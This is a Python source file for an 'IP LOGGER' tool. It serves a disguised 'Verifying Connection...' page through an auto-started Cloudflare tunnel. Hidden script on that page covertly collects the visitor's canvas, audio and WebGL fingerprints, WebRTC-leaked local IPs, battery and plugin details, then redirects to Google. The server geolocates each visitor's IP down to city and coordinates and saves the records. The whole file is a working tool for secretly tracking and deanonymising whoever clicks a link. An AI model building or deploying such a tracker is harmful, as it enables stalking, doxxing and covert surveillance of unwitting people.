import os
import sys
import time
import requests
import threading
import subprocess
import platform
import shutil
import logging
import json
import signal
from datetime import datetime
from flask import Flask, request, redirect
from termcolor import colored, cprint
from colorama import init

init()

PORT = 5000
REDIRECT_URL = "https://www.google.com"
GEO_API_URL = "http://ip-api.com/json/{}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query"

CAPTURED_LOGS = []
TUNNEL_TOKEN = None

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class LoggerUtils:
    @staticmethod
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def print_banner():
        banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║                    IP LOGGER                             ║
    ║                   by ghost0dev                           ║
    ╚══════════════════════════════════════════════════════════╝
        """
        cprint(banner, 'cyan', attrs=['bold'])

    @staticmethod
    def log_info(label, value):
        if value and value != 'Unknown' and value != 'None':
            print(colored(f"   ├─ {label}: ", 'white') + colored(str(value), 'green'))

    @staticmethod
    def log_header(title):
        print(colored(f"\n╔═══ {title} ", 'cyan', attrs=['bold']) + colored(f"[{datetime.now().strftime('%H:%M:%S')}]", 'cyan', attrs=['bold']))

    @staticmethod
    def save_logs_to_json():
        if not CAPTURED_LOGS:
            return
        
        filename = f"logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(CAPTURED_LOGS, f, indent=4)
            cprint(f"\n[✓] Logs saved to: {filename}", 'green', attrs=['bold'])
        except Exception as e:
            cprint(f"\n[✗] Failed to save logs: {e}", 'red')

class GeoLocator:
    @staticmethod
    def get_data(ip):
        try:
            if ip in ['127.0.0.1', '::1']:
                return None
            response = requests.get(GEO_API_URL.format(ip), timeout=5)
            if response.status_code == 200:
                return response.json()
        except Exception:
            return None
        return None

class TunnelManager:
    @staticmethod
    def download_cloudflared():
        binary_name = "cloudflared.exe" if platform.system().lower() == 'windows' else "cloudflared"
        if os.path.exists(binary_name):
            return True

        cprint("[*] Initializing Cloudflared component...", 'cyan')
        system = platform.system().lower()
        machine = platform.machine().lower()
        
        url = ""
        if system == 'windows':
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        elif system == 'linux':
            if 'aarch64' in machine or 'arm64' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            elif 'arm' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        elif system == 'darwin':
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        
        if not url:
            cprint("[!] System architecture not supported for auto-download.", 'red')
            return False

        try:
            resp = requests.get(url, stream=True)
            with open(binary_name, 'wb') as f:
                shutil.copyfileobj(resp.raw, f)
            if system != 'windows':
                os.chmod(binary_name, 0o755)
            cprint("[+] Component installed successfully.", 'green')
            return True
        except Exception as e:
            cprint(f"[!] Installation failed: {e}", 'red')
            return False

    @staticmethod
    def start(token=None):
        if not TunnelManager.download_cloudflared():
            return

        binary = "cloudflared.exe" if platform.system().lower() == 'windows' else "./cloudflared"
        

        for attempt in range(3):
            if os.path.exists("tunnel.log"):
                try:
                    os.remove("tunnel.log")
                    break
                except:
                    time.sleep(0.5)

        if token:
            cprint("[*] Starting Custom Cloudflare Tunnel (Token Mode)...", 'magenta')
            cmd = [binary, "tunnel", "run", "--token", token]
            cprint("[i] Tunnel is running with your custom token.", 'green')
            cprint("[i] Access your configured custom URL now.", 'green')
        else:
            cprint("[*] Starting Quick Cloudflare Tunnel...", 'cyan')
            cmd = [binary, "tunnel", "--url", f"http://localhost:{PORT}", "--logfile", "tunnel.log"]

        try:
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if not token:

                attempts = 0
                while attempts < 30:
                    if os.path.exists("tunnel.log"):
                        try:
                            with open("tunnel.log", "r") as f:
                                content = f.read()
                                if "trycloudflare.com" in content:
                                    import re
                                    url_match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', content)
                                    if url_match:
                                        url = url_match.group(0)
                                        cprint(f"\n[+] SECURE LINK ESTABLISHED: {url}", 'green', attrs=['bold'])
                                        cprint("[i] Traffic is now being monitored. Press Ctrl+C to save logs and exit.\n", 'cyan')
                                        return
                        except:
                            pass
                    time.sleep(1)
                    attempts += 1
                cprint("[!] Tunnel creation timed out.", 'red')
            else:
                cprint("[i] Custom tunnel active. Press Ctrl+C to save logs and exit.\n", 'cyan')

        except Exception as e:
            cprint(f"[!] Tunnel error: {e}", 'red')

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verifying Connection...</title>
        <style>body{margin:0;background:#fff;font-family:Arial;}</style>
    </head>
    <body>
    <script>
        var data = {
            screen: screen.width + "x" + screen.height,
            depth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency || "Unknown",
            platform: navigator.platform,
            browser_lang: navigator.language,
            langs: navigator.languages ? navigator.languages.join(', ') : "Unknown",
            do_not_track: navigator.doNotTrack || "Unknown",
            touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            webgl_vendor: "Unknown",
            webgl_renderer: "Unknown",
            canvas_hash: "",
            audio_hash: "",
            webrtc_ips: [],
            battery: "Unknown",
            connection: "Unknown",
            plugins: []
        };


        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    data.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    data.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch(e) {}


        try {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Browser Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Canvas FP", 4, 17);
            
            var txt = canvas.toDataURL();
            var hash = 0;
            for (var i = 0; i < txt.length; i++) {
                var char = txt.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            data.canvas_hash = hash.toString(16);
        } catch(e) {}


        try {
            var audioContext = new (window.AudioContext || window.webkitAudioContext)();
            var oscillator = audioContext.createOscillator();
            var analyser = audioContext.createAnalyser();
            var gainNode = audioContext.createGain();
            var scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            
            gainNode.gain.value = 0;
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            scriptProcessor.onaudioprocess = function(bins) {
                var output = bins.outputBuffer.getChannelData(0);
                var sum = 0;
                for (var i = 0; i < output.length; i++) {
                    sum += Math.abs(output[i]);
                }
                data.audio_hash = sum.toString();
            };
            
            oscillator.start(0);
            setTimeout(function() { oscillator.stop(); }, 100);
        } catch(e) {}


        try {
            var rtc = new RTCPeerConnection({iceServers:[]});
            rtc.createDataChannel('');
            rtc.createOffer().then(function(offer){return rtc.setLocalDescription(offer)});
            rtc.onicecandidate = function(ice){
                if(!ice || !ice.candidate || !ice.candidate.candidate) return;
                var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
                if(ip) data.webrtc_ips.push(ip[1]);
            };
        } catch(e) {}


        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                data.battery = Math.floor(battery.level * 100) + "% (Charging: " + battery.charging + ")";
            });
        }


        if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            data.connection = (conn.effectiveType || "Unknown") + " (" + (conn.downlink || "?") + " Mbps)";
        }


        if (navigator.plugins) {
            for (var i = 0; i < navigator.plugins.length; i++) {
                data.plugins.push(navigator.plugins[i].name);
            }
        }


        setTimeout(function() {
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(function() {
                window.location.href = "https://www.google.com";
            }).catch(function() {
                window.location.href = "https://www.google.com";
            });
        }, 500);
    </script>
    </body>
    </html>
    """

@app.route('/collect', methods=['POST'])
def collect_data():
    real_ip = request.headers.get('CF-Connecting-IP')
    if not real_ip and request.headers.getlist("X-Forwarded-For"):
        real_ip = request.headers.getlist("X-Forwarded-For")[0]
    if not real_ip:
        real_ip = request.remote_addr
    
    is_ipv6 = ':' in real_ip
    ipv4 = None
    ipv6 = None
    
    if is_ipv6:
        ipv6 = real_ip
    else:
        ipv4 = real_ip
    
    try:
        fp = request.json
    except:
        fp = {}

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    LoggerUtils.log_header("INCOMING CONNECTION")
    
    print(colored("\n   ╠═══ NETWORK INFORMATION", 'white', attrs=['bold']))
    if ipv4:
        LoggerUtils.log_info("IPv4 Address", ipv4)
    if ipv6:
        LoggerUtils.log_info("IPv6 Address", ipv6)
    
    geo_ip = ipv4 if ipv4 else ipv6
    geo = GeoLocator.get_data(geo_ip)
    
    if geo and geo.get('status') == 'success':
        if geo.get('isp'):
            LoggerUtils.log_info("ISP", geo.get('isp'))
        if geo.get('org'):
            LoggerUtils.log_info("Organization", geo.get('org'))
        if geo.get('as'):
            LoggerUtils.log_info("AS Number", geo.get('as'))
        
        print(colored("\n   ╠═══ GEOLOCATION", 'white', attrs=['bold']))
        LoggerUtils.log_info("Country", f"{geo.get('country')} ({geo.get('countryCode')})")
        if geo.get('regionName'):
            LoggerUtils.log_info("Region", geo.get('regionName'))
        LoggerUtils.log_info("City", geo.get('city'))
        if geo.get('zip'):
            LoggerUtils.log_info("Postal Code", geo.get('zip'))
        LoggerUtils.log_info("Coordinates", f"{geo.get('lat')}, {geo.get('lon')}")
        LoggerUtils.log_info("Timezone", geo.get('timezone'))
        
        print(colored("\n   ╠═══ SECURITY ANALYSIS", 'white', attrs=['bold']))
        LoggerUtils.log_info("Mobile", "Yes" if geo.get('mobile') else "No")
        LoggerUtils.log_info("Proxy/VPN", "Detected" if geo.get('proxy') else "None")
        LoggerUtils.log_info("Hosting", "Yes" if geo.get('hosting') else "No")
    
    if fp:
        print(colored("\n   ╠═══ DEVICE FINGERPRINT", 'white', attrs=['bold']))
        if fp.get('screen'):
            LoggerUtils.log_info("Display", fp.get('screen'))
        if fp.get('webgl_renderer'):
            LoggerUtils.log_info("Graphics", fp.get('webgl_renderer'))
        
        cores = fp.get('cores')
        if cores and str(cores).isdigit():
            LoggerUtils.log_info("CPU Threads", cores)
        
        if fp.get('platform'):
            LoggerUtils.log_info("Platform", fp.get('platform'))
        if fp.get('langs'):
            LoggerUtils.log_info("Languages", fp.get('langs'))
        
        if fp.get('canvas_hash') or fp.get('audio_hash'):
            print(colored("\n   ╠═══ UNIQUE IDENTIFIERS", 'white', attrs=['bold']))
            if fp.get('canvas_hash'):
                LoggerUtils.log_info("Canvas Hash", fp.get('canvas_hash'))
            if fp.get('audio_hash'):
                LoggerUtils.log_info("Audio Hash", fp.get('audio_hash'))
        
        webrtc_ips = fp.get('webrtc_ips', [])
        if webrtc_ips:
            print(colored("\n   ╠═══ WEBRTC LEAK", 'red', attrs=['bold']))
            for idx, leaked_ip in enumerate(webrtc_ips):
                LoggerUtils.log_info(f"Local IP #{idx+1}", leaked_ip)
    
    print(colored("\n   ╚═══ Session Time: ", 'white') + colored(timestamp, 'green'))
    print(colored("   " + "─"*60 + "\n", 'cyan'))
    
    log_entry = {
        "type": "advanced_fingerprint",
        "timestamp": timestamp,
        "ipv4": ipv4,
        "ipv6": ipv6,
        "user_agent": user_agent,
        "fingerprint": fp,
        "geolocation": geo or {}
    }
    
    CAPTURED_LOGS.append(log_entry)
    return "OK"

def signal_handler(sig, frame):
    cprint("\n\n[*] Stopping server...", 'yellow')
    LoggerUtils.save_logs_to_json()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    
    LoggerUtils.clear_screen()
    LoggerUtils.print_banner()
    
    cprint("\n[*] Initializing Automatic Quick Tunnel...", 'cyan')
    
    tunnel_thread = threading.Thread(target=TunnelManager.start)
    tunnel_thread.daemon = True
    tunnel_thread.start()
    
    cprint(f"[*] Initializing local listener on port {PORT}...", 'cyan')
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == '__main__':
    main()
